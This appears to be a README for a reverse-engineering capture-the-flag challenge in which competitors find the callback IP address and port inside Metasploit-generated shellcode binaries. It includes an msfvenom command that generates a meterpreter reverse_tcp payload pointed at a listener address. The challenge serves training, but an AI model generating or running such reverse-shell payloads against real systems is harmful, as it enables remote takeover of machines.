# can_you_run_it
Shellcode Runner Reverse Engineering Challenges.

The competitor is tasked in reverse engineering the Metasploit framework (msf) generated binaries
to identify the flag. The flag is the IP address + port the Msf binaries connect back to.

Difficulty can be increased by not indicating the underlying architecture to the competitor.

## Example

Generate the binary via the command below.

```bash
msfvenom -f raw -p linux/x86/meterpreter/reverse_tcp  LHOST=192.168.132.22 LPORT=31337 -o shellcode_1.bin
```

Flag would be `192.168.132.22:31337`
